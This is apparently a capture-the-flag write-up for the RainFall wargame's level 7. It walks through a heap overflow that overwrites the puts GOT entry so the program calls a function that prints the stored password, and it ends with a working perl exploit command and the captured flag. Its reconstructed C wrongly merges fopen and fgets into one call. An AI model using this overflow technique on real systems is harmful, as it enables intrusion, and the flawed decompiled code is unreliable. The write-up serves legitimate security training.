# Solution

Here is the reverse binary representation but in C


```c
char    c[68];

void    m(void)
{
    printf("%s - %d\n", c, (int)time(0));
}

int main(int ac, char **av)
{
    int *a;
    int *b;
    
    a = malloc(8);
    a[0] = 1;
    a[1] = (int)malloc(8);

    b = malloc(8);
    b[0] = 2;
    b[1] = (int)malloc(8);

    strcpy((char *)a[1], av[1]);
    strcpy((char *)b[1], av[2]);

    fgets(c, 68, "/home/user/level8/.pass", "r");

    puts("~~");

    return (0);
}
```

So we see two call to strcpy this function can lead to an overflow which here will be the case,
we also see multiple call of malloc so this will be an heap overflow.

If we take a closer look in gdb and try to do some dynamic binary analysis we will find one thing that is interesting.

Let's break before the first malloc first.

```sh
gef➤ b *0x08048532
```

If we look at the address return by malloc after passing through all the malloc we will find our exploit pretty easily.Jk

Here a quick look at the address of the first follow by the 20 address

```sh
gef➤  x/20wx 0x0804a1a0
0x804a1a0:      0x00000001      0x0804a1b0      0x00000000      0x00000011
0x804a1b0:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a1c0:      0x00000002      0x0804a1d0      0x00000000      0x00000011
0x804a1d0:      0x00000000      0x00000000      0x00000000      0x00021e29
0x804a1e0:      0x00000000      0x00000000      0x00000000      0x00000000
```

We can see two information that are very interesting first that when we do this line:

```c
strcpy((char *)a[1], av[1]);
```

we are writing in `0x0804a1b0` address and if you look just under this address you can see that we can access,
the second pointer `b` and that we can overwrite the address that you will use to write data in,
which here by default is `0x0804a1d0`.

So the exploit here will be to find the entry of the GOT of `puts` and then overwrite that entry by the function
`m` which will drop the flag for us since it's stored in c buffer which is a global variable,
so when `puts` will be called it will not call the libc function `puts` but the function `m` instead.

But before creating the payload we need to find the address of the entry of the GOT (Global Offset Table) of `puts`,
to do so we will use readelf -r which will output the relocation table, which is the execution view (runtime) of the binary when the function will be replace (relocated) by another shared object through the dynamic linker.
This will give me the exact address of the `puts` entry in the .got.plt section.

```sh
level7@RainFall:~$ readelf -r ./level7 

Relocation section '.rel.dyn' at offset 0x31c contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049904  00000706 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x324 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049914  00000107 R_386_JUMP_SLOT   00000000   printf
08049918  00000207 R_386_JUMP_SLOT   00000000   fgets
0804991c  00000307 R_386_JUMP_SLOT   00000000   time
08049920  00000407 R_386_JUMP_SLOT   00000000   strcpy
08049924  00000507 R_386_JUMP_SLOT   00000000   malloc
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
0804992c  00000707 R_386_JUMP_SLOT   00000000   __gmon_start__
08049930  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main
08049934  00000907 R_386_JUMP_SLOT   00000000   fopen
```

So the address of `puts` entry in the GOT will be `0x8049928` now let's fetch the address of `m` pretty simple we can use gdb.

```sh
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```

Now let's write the exploit we need to pad `av[1]` with enough byte to hit the address of `b[1]` to overwrite it with,
`puts` entry in the GOT and overwrite it to the address of `m` so that `puts` is not called but `m` instead.


```sh
level7@RainFall:~$ ./level7 $(perl -e 'print "A"x20 . "(\x99\x04\x08"') $(perl -e 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1727366736
```

We have the flag.
